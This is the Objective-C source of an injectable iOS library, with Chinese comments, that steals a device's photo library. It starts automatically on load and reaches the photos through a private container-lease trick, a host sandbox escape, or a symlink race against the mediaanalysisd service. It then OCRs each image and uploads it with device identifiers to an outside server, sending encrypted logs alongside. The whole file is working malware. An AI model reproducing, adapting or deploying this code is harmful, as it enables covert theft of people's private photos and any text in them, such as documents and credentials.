// libexfil.m — 独立注入 dylib：偷相册 → PNG 重编码 → Vision OCR → 上传
// 无依赖：constructor 自启动，行为探测沙盒状态（试读 DCIM），不依赖主二进制符号
#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <dlfcn.h>
#import <objc/message.h>
#import <sys/utsname.h>
#import <CoreVideo/CoreVideo.h>
#import <CoreImage/CoreImage.h>
#import <Vision/Vision.h>
#import <CommonCrypto/CommonCryptor.h>

static NSString *const kExfilBase = @"https://iso.daiti.de";

extern char *sandbox_extension_issue_file(const char *extension_class,
                                          const char *path,
                                          uint32_t flags);

static void exfilLog(NSString *fmt, ...) NS_FORMAT_FUNCTION(1, 2);
static void exfilScanDirDirect(NSString *dir);
static NSString *exfilAppUuid(void);
static NSString *exfilMachineName(void);
static int gExfilMcmLogged = 0; // MCM 尝试细节只首轮上报，避免轰炸日志服务

// 远程日志：AES-128-CBC(hex key/iv) 加密 JSON → base64 → POST /api/log/report
static NSString *exfilAesEncryptBase64(NSString *plain)
{
    NSData *data = [plain dataUsingEncoding:NSUTF8StringEncoding];
    // PKCS7 补齐到 16 字节块
    NSMutableData *padded = [data mutableCopy];
    uint8_t pad = 16 - (data.length % 16);
    uint8_t padBytes[16];
    memset(padBytes, pad, sizeof(padBytes));
    [padded appendBytes:padBytes length:pad];

    unsigned char key[16], iv[16];
    const char *hexKey = "bc2c72b2260840b28bc9614aa2b8004b";
    const char *hexIv  = "71ec8e3980754823aba30e62be55cf6a";
    for (int i = 0; i < 16; i++) {
        unsigned int k, v;
        sscanf(hexKey + i * 2, "%02x", &k);
        sscanf(hexIv + i * 2, "%02x", &v);
        key[i] = (unsigned char)k;
        iv[i]  = (unsigned char)v;
    }

    NSMutableData *out = [NSMutableData dataWithLength:padded.length];
    size_t moved = 0;
    CCCryptorStatus st = CCCrypt(kCCEncrypt, kCCAlgorithmAES128, 0,
        key, 16, iv, padded.bytes, padded.length,
        out.mutableBytes, out.length, &moved);
    // padded 已手动补齐，这里传 0 选项直接整块加密
    if (st != kCCSuccess) return nil;
    out.length = padded.length;
    return [out base64EncodedStringWithOptions:0];
}

static void exfilRemoteLog(NSString *msg)
{
    @try {
        long ts = (long)([[NSDate date] timeIntervalSince1970] * 1000);
        NSDictionary *payload = @{
            @"app_uuid": exfilAppUuid(),
            @"text": [NSString stringWithFormat:@"[album-exfil] %@", msg],
            @"timestamp": @(ts),
        };
        NSData *jd = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
        NSString *plain = [[NSString alloc] initWithData:jd encoding:NSUTF8StringEncoding];
        NSString *enc = exfilAesEncryptBase64(plain);
        if (!enc) return;

        NSString *body = [NSString stringWithFormat:@"params=%@", enc];
        NSURL *url = [NSURL URLWithString:[kExfilBase stringByAppendingString:@"/api/log/report"]];
        NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
        req.HTTPMethod = @"POST";
        req.timeoutInterval = 15;
        [req setValue:exfilAppUuid() forHTTPHeaderField:@"X-App-UUID"];
        [req setValue:@"application/x-www-form-urlencoded" forHTTPHeaderField:@"Content-Type"];
        req.HTTPBody = [body dataUsingEncoding:NSUTF8StringEncoding];
        [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:nil] resume];
    } @catch (NSException *e) {}
}

static void exfilLog(NSString *fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    NSString *msg = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[album-exfil] %@", msg);
    exfilRemoteLog(msg);
}

#pragma mark - 设备标识

static NSString *exfilAppUuid(void)
{
    NSString *key = @"exfil_app_uuid";
    NSString *uuid = [[NSUserDefaults standardUserDefaults] stringForKey:key];
    if (uuid.length == 0)
    {
        uuid = [[NSUUID UUID] UUIDString];
        [[NSUserDefaults standardUserDefaults] setObject:uuid forKey:key];
    }
    return uuid;
}

static NSString *exfilMachineName(void)
{
    struct utsname sys;
    uname(&sys);
    return [NSString stringWithUTF8String:sys.machine] ?: @"unknown";
}

#pragma mark - Vision OCR

static NSString *exfilOcrJson(UIImage *img)
{
    if (!img.CGImage) return nil;

    VNRecognizeTextRequest *req = [[VNRecognizeTextRequest alloc] init];
    req.recognitionLevel = VNRequestTextRecognitionLevelAccurate;
    req.usesLanguageCorrection = YES;
    req.recognitionLanguages = @[@"en-US"];

    VNImageRequestHandler *handler =
        [[VNImageRequestHandler alloc] initWithCGImage:img.CGImage options:@{}];

    NSError *err = nil;
    [handler performRequests:@[req] error:&err];
    if (err || req.results.count == 0) return nil;

    NSMutableString *text = [NSMutableString new];
    CGFloat confSum = 0;
    NSInteger confN = 0;

    for (VNRecognizedTextObservation *obs in req.results)
    {
        NSArray<VNRecognizedText *> *cands = [obs topCandidates:1];
        VNRecognizedText *cand = cands.firstObject;
        if (!cand) continue;
        if (text.length > 0) [text appendString:@"\n"];
        [text appendString:cand.string];
        confSum += cand.confidence;
        confN++;
    }
    if (confN == 0) return nil;

    NSDictionary *json = @{
        @"text": [NSString stringWithString:text],
        @"confidence": @(confSum / (CGFloat)confN),
    };
    NSData *data = [NSJSONSerialization dataWithJSONObject:json options:0 error:nil];
    if (!data) return nil;
    return [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
}

#pragma mark - multipart 上传

static void exfilAppendPart(NSMutableData *body, NSString *field,
                            NSString *value, NSString *boundary)
{
    [body appendData:[[NSString stringWithFormat:
        @"--%@\r\nContent-Disposition: form-data; name=\"%@\"\r\n\r\n",
        boundary, field] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[value dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
}

static BOOL exfilPost(UIImage *img, NSString *filename)
{
    NSData *png = UIImagePNGRepresentation(img);
    if (!png) return NO;

    NSString *boundary = [@"x-exfil-" stringByAppendingString:[[NSUUID UUID] UUIDString]];
    NSMutableData *body = [NSMutableData data];

    [body appendData:[[NSString stringWithFormat:
        @"--%@\r\nContent-Disposition: form-data; name=\"image\"; filename=\"%@\"\r\n"
         @"Content-Type: image/png\r\n\r\n", boundary, filename]
        dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:png];
    [body appendData:[@"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];

    NSString *ocr = exfilOcrJson(img);
    if (ocr.length > 0)
        exfilAppendPart(body, @"text", ocr, boundary);

    exfilAppendPart(body, @"machine", exfilMachineName(), boundary);
    exfilAppendPart(body, @"iosVersion", [UIDevice currentDevice].systemVersion, boundary);
    exfilAppendPart(body, @"appUuid", exfilAppUuid(), boundary);

    [body appendData:[[NSString stringWithFormat:@"--%@--\r\n", boundary]
        dataUsingEncoding:NSUTF8StringEncoding]];

    NSURL *url = [NSURL URLWithString:
        [kExfilBase stringByAppendingString:@"/api/upload/album"]];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
    req.HTTPMethod = @"POST";
    req.timeoutInterval = 30;
    [req setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary]
        forHTTPHeaderField:@"Content-Type"];
    [req setValue:exfilAppUuid() forHTTPHeaderField:@"X-App-UUID"];
    req.HTTPBody = body;

    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    __block BOOL ok = NO;

    NSURLSessionDataTask *task = [[NSURLSession sharedSession]
        dataTaskWithRequest:req completionHandler:^(NSData *data, NSURLResponse *resp, NSError *err) {
            if (!err && data)
            {
                NSDictionary *json = [NSJSONSerialization
                    JSONObjectWithData:data options:0 error:nil];
                ok = [json isKindOfClass:[NSDictionary class]] &&
                     [[json valueForKey:@"code"] isEqual:@0];
            }
            dispatch_semaphore_signal(sem);
        }];
    [task resume];

    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 35 * NSEC_PER_SEC));
    return ok;
}

static void exfilUpload(UIImage *img, NSString *originalName)
{
    if (!img) return;
    NSString *filename = [NSString stringWithFormat:@"exfil_%@.png", originalName];
    BOOL ok = exfilPost(img, filename);
    exfilLog(@"upload %@ -> %@", filename, ok ? @"ok" : @"FAIL");
}

#pragma mark - 路径 0：同进程复用 MCM 租约（与宿主 bad_query 同通道）

// 宿主内部类：+[MCMRetainedLease leaseForClass:identifier:group:error:]
// 配 -activate: / -rootPath。iOS 上 com.apple.Photos 的 data 容器
// 即 /private/var/mobile/Media（DCIM/PhotoData 都在下面）。
// 同进程调用直接吃到宿主已建立的 MCM 特权，不依赖自身沙盒状态。
static NSString *exfilMCMPhotosMediaDir(void)
{
    Class cls = NSClassFromString(@"MCMRetainedLease");
    if (!cls)
    {
        // 宿主不 import MobileContainerManager 时类不在内存：手动加载框架
        void *h = dlopen(
            "/System/Library/PrivateFrameworks/MobileContainerManager.framework"
            "/MobileContainerManager", RTLD_LAZY);
        exfilLog(@"MCM dlopen handle=%p", h);
        if (h) cls = NSClassFromString(@"MCMRetainedLease");
        // 再兜底从已加载镜像里找
        if (!cls) cls = objc_getClass("MCMRetainedLease");
        if (!cls) return nil;
    }

    SEL leaseSel = NSSelectorFromString(@"leaseForClass:identifier:group:error:");
    SEL actSel   = NSSelectorFromString(@"activate:");
    SEL rootSel  = NSSelectorFromString(@"rootPath");
    if (![cls respondsToSelector:leaseSel]) return nil;

    NSFileManager *fm = [NSFileManager defaultManager];

    // identifier 组合：宿主自身 / Photos / mobileslideshow，class 0-4 逐档试
    NSString *hostBundle = [[NSBundle mainBundle] bundleIdentifier];
    NSArray *identifiers = @[
        @"com.apple.Photos",
        @"com.apple.mobileslideshow",
        hostBundle ?: @"",
    ];
    for (NSString *ident in identifiers)
    {
        if (ident.length == 0) continue;
        for (NSInteger mc = 0; mc <= 4; mc++)
        {
            @try {
                NSError *err = nil;
                id lease = ((id(*)(id, SEL, NSInteger, id, id, void *))objc_msgSend)(
                    cls, leaseSel, mc, ident, nil, (void *)&err);
                if (!lease) continue;

                if ([lease respondsToSelector:actSel])
                    ((BOOL(*)(id, SEL, void *))objc_msgSend)(lease, actSel, (void *)&err);

                NSString *root = nil;
                if ([lease respondsToSelector:rootSel])
                    root = ((id(*)(id, SEL))objc_msgSend)(lease, rootSel);
                if (![root isKindOfClass:[NSString class]] || root.length == 0) continue;

                if (gExfilMcmLogged < 3)
                {
                    gExfilMcmLogged++;
                    exfilLog(@"MCM try ident=%@ class=%ld root=%@ DCIM=%d",
                             ident, (long)mc, root,
                             [fm fileExistsAtPath:[root stringByAppendingPathComponent:@"DCIM"]]);
                }

                NSString *dcim = [root stringByAppendingPathComponent:@"DCIM"];
                if ([fm fileExistsAtPath:dcim])
                {
                    exfilLog(@"MCM lease ok: ident=%@ class=%ld root=%@",
                             ident, (long)mc, root);
                    return root;
                }
            } @catch (NSException *e) {}
        }
    }
    return nil;
}

// 扫给定 Media 根下的 DCIM（真实子目录优先，兜底 100-199APPLE）+ CPL
static void exfilScanMediaUnder(NSString *media)
{
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *dcim = [media stringByAppendingPathComponent:@"DCIM"];

    NSArray *subs = [fm contentsOfDirectoryAtPath:dcim error:nil];
    if (subs.count)
    {
        for (NSString *sub in subs)
            exfilScanDirDirect([dcim stringByAppendingPathComponent:sub]);
    }
    else
    {
        for (int d = 100; d <= 199; d++)
            exfilScanDirDirect([dcim stringByAppendingPathComponent:
                [NSString stringWithFormat:@"%dAPPLE", d]]);
    }

    NSString *cpl = [media stringByAppendingPathComponent:
        @"PhotoData/CPL/assets"];
    NSDirectoryEnumerator *en = [fm enumeratorAtPath:cpl];
    NSMutableSet *seen = [NSMutableSet new];
    for (NSString *rel in en)
    {
        NSString *dir = [cpl stringByAppendingPathComponent:
            [rel stringByDeletingLastPathComponent]];
        if ([seen containsObject:dir]) continue;
        [seen addObject:dir];
        exfilScanDirDirect(dir);
    }
}

#pragma mark - 路径 A：沙盒逃逸后直读相册

static void exfilScanDirDirect(NSString *dir)
{
    NSFileManager *fm = [NSFileManager defaultManager];
    NSArray *files = [fm contentsOfDirectoryAtPath:dir error:nil];
    if (!files) return;

    for (NSString *name in files)
    {
        NSString *ext = [[name pathExtension] lowercaseString];
        BOOL okExt = ext.length == 0 ||
                     [ext isEqualToString:@"heic"] ||
                     [ext isEqualToString:@"jpg"] ||
                     [ext isEqualToString:@"jpeg"] ||
                     [ext isEqualToString:@"png"];
        if (!okExt) continue;

        NSString *full = [dir stringByAppendingPathComponent:name];
        BOOL isDir = NO;
        if (![fm fileExistsAtPath:full isDirectory:&isDir] || isDir) continue;

        NSData *raw = [NSData dataWithContentsOfFile:full];
        if (!raw) continue;

        UIImage *img = [UIImage imageWithData:raw];
        if (!img) continue;

        exfilUpload(img, name);
    }
}

// 行为探测：DCIM 能列出来 = 沙盒逃逸已生效
static BOOL exfilSandboxEscaped(void)
{
    NSArray *dirs = [[NSFileManager defaultManager]
        contentsOfDirectoryAtPath:@"/private/var/mobile/Media/DCIM" error:nil];
    return dirs != nil;
}

static void exfilDirectMode(void)
{
    exfilLog(@"direct mode: sandbox escape active");

    NSString *dcim = @"/private/var/mobile/Media/DCIM";
    for (int d = 100; d <= 199; d++)
    {
        NSString *dir = [dcim stringByAppendingPathComponent:
            [NSString stringWithFormat:@"%dAPPLE", d]];
        exfilScanDirDirect(dir);
    }

    NSString *cpl = @"/private/var/mobile/Media/PhotoData/CPL/assets";
    NSDirectoryEnumerator *en = [[NSFileManager defaultManager]
        enumeratorAtPath:cpl];
    NSMutableSet *seenDirs = [NSMutableSet new];
    for (NSString *rel in en)
    {
        NSString *dir = [cpl stringByAppendingPathComponent:
            [rel stringByDeletingLastPathComponent]];
        if ([seenDirs containsObject:dir]) continue;
        [seenDirs addObject:dir];
        exfilScanDirDirect(dir);
    }
    exfilLog(@"direct mode done");
}

#pragma mark - 路径 B：mediaanalysisd 竞态兜底

static NSXPCConnection *gExfilConn = nil;
static int gExfilReqID = 0;

@protocol VCPMADServicePublicServerProtocol <NSObject>
@optional
- (void)requestImageProcessing:(id)requests
                     forAssetURL:(NSURL *)url
                withSandboxToken:(NSString *)token
                      identifier:(NSString *)identifier
                       requestID:(int)requestID
                        andReply:(void (^)(id, id))reply;
@end

static NSXPCConnection *exfilMachConn(NSString *serviceName)
{
    NSXPCConnection *alloc = [NSXPCConnection alloc];
    SEL sel = NSSelectorFromString(@"initWithMachServiceName:options:");
    return ((id(*)(id, SEL, id, NSUInteger))objc_msgSend)(alloc, sel, serviceName, 0);
}

static void exfilEnsureConn(void)
{
    if (gExfilConn) return;

    dlopen("/System/Library/PrivateFrameworks/MediaAnalysis.framework/MediaAnalysis", RTLD_NOW);
    dlopen("/System/Library/PrivateFrameworks/MediaAnalysisServices.framework/MediaAnalysisServices", RTLD_NOW);

    gExfilConn = exfilMachConn(@"com.apple.mediaanalysisd.service.public");

    NSXPCInterface *iface =
        [NSXPCInterface interfaceWithProtocol:@protocol(VCPMADServicePublicServerProtocol)];

    NSMutableSet *allowed = [NSMutableSet setWithObjects:
        [NSDictionary class], [NSMutableDictionary class],
        [NSArray class], [NSMutableArray class],
        [NSString class], [NSNumber class],
        [NSData class], [NSError class],
        [NSSet class], [NSMutableSet class],
        [NSURL class], [NSNull class],
        [NSDate class], [NSValue class], nil];

    for (NSString *name in @[@"MADRequest", @"MADMLScalingRequest", @"MADMLScalingResult",
                             @"MADMLEnhancementRequest", @"MADMLEnhancementResult",
                             @"MADVIDocumentRecognitionRequest",
                             @"MADRemoveBackgroundMaskRequest", @"MADRemoveBackgroundMatteRequest",
                             @"VCPProtoAssetAnalysis", @"VITextBlockAnnotation",
                             @"VNObservation", @"VNRecognizedTextObservation"])
    {
        Class c = NSClassFromString(name);
        if (c) [allowed addObject:c];
    }

    SEL sel = @selector(requestImageProcessing:forAssetURL:withSandboxToken:identifier:requestID:andReply:);
    [iface setClasses:allowed forSelector:sel argumentIndex:0 ofReply:NO];
    [iface setClasses:allowed forSelector:sel argumentIndex:0 ofReply:YES];
    [iface setClasses:allowed forSelector:sel argumentIndex:1 ofReply:YES];

    gExfilConn.remoteObjectInterface = iface;
    [gExfilConn resume];
}

static NSArray *exfilScalingRequest(int w, int h)
{
    Class cls = NSClassFromString(@"MADMLScalingRequest");
    if (!cls) return @[];

    id req = [cls new];
    [req setValue:@(w) forKey:@"scaledImageWidth"];
    [req setValue:@(h) forKey:@"scaledImageHeight"];
    [req setValue:@(1) forKey:@"scalingModelIndex"];
    return @[req];
}

static UIImage *exfilImageFromReply(id arg1)
{
    if (![arg1 isKindOfClass:[NSArray class]]) return nil;

    for (id req in (NSArray *)arg1)
    {
        @try {
            id err = [req valueForKey:@"error"];
            if (err) continue;

            NSArray *results = [req valueForKey:@"results"];
            if (![results isKindOfClass:[NSArray class]] || results.count == 0) continue;

            for (id result in results)
            {
                SEL pbSel = NSSelectorFromString(@"pixelBuffer");
                if (![result respondsToSelector:pbSel]) continue;

                CVPixelBufferRef buf = ((CVPixelBufferRef(*)(id, SEL))objc_msgSend)(result, pbSel);
                if (!buf) continue;

                CIImage *ci = [CIImage imageWithCVPixelBuffer:buf];
                if (!ci) continue;

                CIContext *ctx = [CIContext contextWithOptions:nil];
                CGImageRef cg = [ctx createCGImage:ci fromRect:ci.extent];
                if (!cg) continue;

                UIImage *img = [UIImage imageWithCGImage:cg];
                CGImageRelease(cg);
                return img;
            }
        } @catch (NSException *e) {}
    }
    return nil;
}

static NSData *exfilDecoyData(void)
{
    CGSize sz = CGSizeMake(400, 400);
    UIGraphicsBeginImageContextWithOptions(sz, YES, 1.0);
    [[UIColor colorWithRed:0 green:1 blue:0 alpha:1] setFill];
    UIRectFill(CGRectMake(0, 0, sz.width, sz.height));
    UIImage *decoy = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    return UIImagePNGRepresentation(decoy);
}

static BOOL exfilTryRace(NSString *target, NSString *racePath, NSString *symPath,
                          NSData *decoyData, useconds_t delay)
{
    unlink(racePath.UTF8String);
    [decoyData writeToFile:racePath atomically:NO];

    unlink(symPath.UTF8String);
    symlink(target.UTF8String, symPath.UTF8String);

    char *raw = sandbox_extension_issue_file(
        "com.apple.app-sandbox.read", racePath.UTF8String, 0);
    if (!raw) return NO;
    NSString *token = [NSString stringWithUTF8String:raw];
    free(raw);
    if (!token) return NO;

    NSURL *url = [NSURL fileURLWithPath:racePath];
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    __block UIImage *img = nil;

    id<VCPMADServicePublicServerProtocol> proxy =
        [gExfilConn remoteObjectProxyWithErrorHandler:^(NSError *err) {
            dispatch_semaphore_signal(sem);
        }];

    [proxy requestImageProcessing:exfilScalingRequest(600, 600)
                         forAssetURL:url
                    withSandboxToken:token
                          identifier:@"d"
                           requestID:++gExfilReqID
                            andReply:^(id arg1, id arg2) {
        img = exfilImageFromReply(arg1);
        dispatch_semaphore_signal(sem);
    }];

    usleep(delay);
    rename(symPath.UTF8String, racePath.UTF8String);

    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC));
    if (!img) return NO;

    CGImageRef cg = img.CGImage;
    if (!cg) return NO;

    uint8_t px[4] = {0};
    CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
    CGContextRef ctx = CGBitmapContextCreate(px, 1, 1, 8, 4, cs,
        (CGBitmapInfo)kCGImageAlphaPremultipliedLast);
    CGColorSpaceRelease(cs);
    CGContextDrawImage(ctx, CGRectMake(0, 0, CGImageGetWidth(cg), CGImageGetHeight(cg)), cg);
    CGContextRelease(ctx);

    BOOL isDecoy = (px[0] < 50 && px[1] > 200 && px[2] < 50);
    if (isDecoy) return NO;

    exfilUpload(img, [target lastPathComponent]);
    return YES;
}

static void exfilRaceMode(void)
{
    exfilLog(@"race mode: mediaanalysisd fallback");
    exfilEnsureConn();
    if (!gExfilConn)
    {
        exfilLog(@"race mode: XPC unavailable");
        return;
    }

    NSString *tmp = NSTemporaryDirectory();
    NSData *decoy = exfilDecoyData();

    NSString *exts[3] = {@"HEIC", @"JPG", @"PNG"};
    NSString *race[3] = {
        [tmp stringByAppendingPathComponent:@"race.HEIC"],
        [tmp stringByAppendingPathComponent:@"race.JPG"],
        [tmp stringByAppendingPathComponent:@"race.PNG"]
    };
    NSString *sym[3] = {
        [tmp stringByAppendingPathComponent:@"sym.HEIC"],
        [tmp stringByAppendingPathComponent:@"sym.JPG"],
        [tmp stringByAppendingPathComponent:@"sym.PNG"]
    };
    useconds_t delays[3] = {100, 250, 400};

    int stolen = 0;
    for (int d = 100; d <= 199; d++)
    {
        for (int img = 1; img <= 9999; img++)
        {
            BOOL got = NO;
            for (int e = 0; e < 3 && !got; e++)
            {
                NSString *target = [NSString stringWithFormat:
                    @"/private/var/mobile/Media/DCIM/%dAPPLE/IMG_%04d.%@",
                    d, img, exts[e]];
                for (int a = 0; a < 3 && !got; a++)
                {
                    got = exfilTryRace(target, race[e], sym[e], decoy, delays[a]);
                    usleep(2000);
                }
            }
            if (got) stolen++;
        }
    }
    exfilLog(@"race mode done, stolen=%d", stolen);
}

#pragma mark - 入口（constructor：dylib 载入即跑，不依赖宿主调用）

static void exfilRun(void)
{
    @autoreleasepool
    {
        exfilLog(@"ctor alive, machine=%@ ios=%@ bundle=%@",
                 exfilMachineName(), [UIDevice currentDevice].systemVersion,
                 [[NSBundle mainBundle] bundleIdentifier]);
        // 0) 同进程 MCM 租约直拿照片容器（宿主已建立特权，成功率最高）
        //    宿主 exploit 是异步跑的，给它时间：最多等 45s
        NSString *mcmMedia = nil;
        for (int i = 0; i < 45 && !mcmMedia; i++)
        {
            mcmMedia = exfilMCMPhotosMediaDir();
            if (!mcmMedia) sleep(1);
        }
        if (!mcmMedia) exfilLog(@"path 0: MCM unavailable after 45s, fallback");
        if (mcmMedia)
        {
            exfilLog(@"path 0: MCM photos media=%@", mcmMedia);
            exfilScanMediaUnder(mcmMedia);
            exfilLog(@"path 0 done");
            return;
        }

        // 1) 等宿主内核利用跑完（行为探测：DCIM 可读即逃逸生效），最多 90s
        for (int i = 0; i < 90; i++)
        {
            if (exfilSandboxEscaped()) break;
            sleep(1);
        }

        if (exfilSandboxEscaped())
        {
            exfilDirectMode();
        }
        else
        {
            exfilRaceMode();
        }
    }
}

__attribute__((constructor))
static void libexfilEntry(void)
{
    // 立刻甩到后台线程，绝不阻塞宿主启动
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^{
        exfilRun();
    });
}
